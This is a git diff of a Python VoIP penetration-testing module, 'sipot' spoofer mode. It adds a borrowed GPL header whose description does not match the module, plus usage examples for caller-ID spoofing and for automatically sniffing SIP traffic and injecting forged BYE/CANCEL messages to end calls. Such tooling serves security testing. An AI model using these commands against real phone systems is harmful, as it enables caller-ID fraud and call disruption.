@@ -1,4 +1,26 @@
 # Spoofing App
+__GPL__ = """
+
+   Sipvicious extension line scanner scans SIP PaBXs for valid extension lines
+   Copyright (C) 2012 Sandro Gauci <sandro@enablesecurity.com>
+
+   This program is free software: you can redistribute it and/or modify
+   it under the terms of the GNU General Public License as published by
+   the Free Software Foundation, either version 3 of the License, or
+   (at your option) any later version.
+   
+   This program is distributed in the hope that it will be useful,
+   but WITHOUT ANY WARRANTY; without even the implied warranty of
+   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+   GNU General Public License for more details.
+   
+   You should have received a copy of the GNU General Public License
+   along with this program.  If not, see <http://www.gnu.org/licenses/>.
+"""
+__author__ = "Nitsuga"
+__version__ = 'alpha'
+__prog__ = 'sipot: spoofer module'
+__desc__ = "SIP Open Tester"
 #===================================================================================================================
 #------------------------------IMPORT------------------------------
 try:
@@ -7,6 +29,8 @@ try:
 	from hashlib import md5
 	from base64 import urlsafe_b64encode
 	# scapy
+	import logging
+	logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 	sys.path.append(''.join([os.getcwd(), '/lib/scapy']))
 	from scapy.all import *
 	# 39peers (IPv6 fixed)
@@ -17,6 +41,23 @@ try:
 	from helper_functions import bcolors
 except ImportError: print 'We had a problem importing dependencies.'; traceback.print_exc(); sys.exit(1)
 #===================================================================================================================
+def module_Usage(usage):
+	usage += "Spoofing mode:\r\n"
+	usage += "\t *** Spoofs Caller ID: ***\r\n"
+	usage += "\t python %prog --sipot-mode spoofing --to sip:111@192.168.1.128:58386 --spoof-name Spoofed!\r\n"
+	usage += "\t *** Spoofs Caller ID from message provided in file: ***\r\n"
+	usage += "\t python %prog --sipot-mode spoofing --to sip:111@192.168.1.128:58386 --spoof-msg-file examples/example_sipot_spoof_this.txt \r\n"
+	usage += "\t *** Spoofs BYE msg and spoof BYE from 200 OK: ***\r\n"
+	usage += "\t python %prog --sipot-mode spoofing --spoof spfBYE --to sip:108@192.168.56.101:5060 --spoof-msg-file examples/example_sipot_spoof_bye.txt (Needs dialogID to be manually set)\r\n"
+	usage += "\t python %prog --sipot-mode spoofing --spoof spfBYE --to sip:108@192.168.56.101:5060 --spoof-msg-file examples/example_sipot_spoof_bye_from_200.txt \r\n"
+	usage += "\t *** Spoofs CANCEL msg and spoof CANCEL from 180 Ringing: ***\r\n"
+	usage += "\t python %prog --sipot-mode spoofing --spoof spfCANCEL --to sip:108@192.168.1.77:5060 --spoof-msg-file examples/example_sipot_spoof_cancel.txt (Needs dialogID to be manually set)\r\n"
+	usage += "\t python %prog --sipot-mode spoofing --spoof spfCANCEL --to sip:108@192.168.1.77:5060 --spoof-msg-file examples/example_sipot_spoof_cancel_from_180.txt \r\n"
+	usage += "\t *** Automatic spoofing BYE/CANCEL when 200 OK/180 RINGING is detected: ***\r\n"
+	usage += "\t python %prog --sipot-mode spoofing --spoof-auto --spoof spfBYE \r\n"
+	usage += "\t python %prog --sipot-mode spoofing --spoof-auto --spoof spfCANCEL \r\n"
+	usage += "\r\n"
+	return usage
 def module_Options(parser):
 	from optparse import OptionGroup
 	group_spoofer = OptionGroup(parser, 'Spoofing Mode', 'use this options to set spoof parameters')
@@ -75,13 +116,13 @@ class spooferUser(User):
 				self._spooferGen  = self._spoofing()
 				multitask.add(self._spooferGen)
 		return self
+	
 	def add_sniffer(self):
 		if not self._snifferGen:
 			self._snifferGen  = self._sniffer(prn=self._auto_SIPrecvd, filter="ip and port 5060", store=0)
 			multitask.add(self._snifferGen)
 		return self
 	
-	# Spoof msg content ---------
 	def spoofMsg(self,message,B_host=False):
 		def _createBYE(message,B_host=False):
 			def BYEheaders(message):
@@ -173,6 +214,7 @@ class spooferUser(User):
 						print "[*] Sending CANCEL to (B): "+str(self.remoteParty.uri.hostPort)
 						self.send(str(spoof_message),self.remoteParty.uri.hostPort,None)
 		except ValueError, E: pass # TODO: send 400 response to non-ACK request
+	
 	def _auto_spoofing(self):
 		try:
 			is_admin = os.getuid() == 0
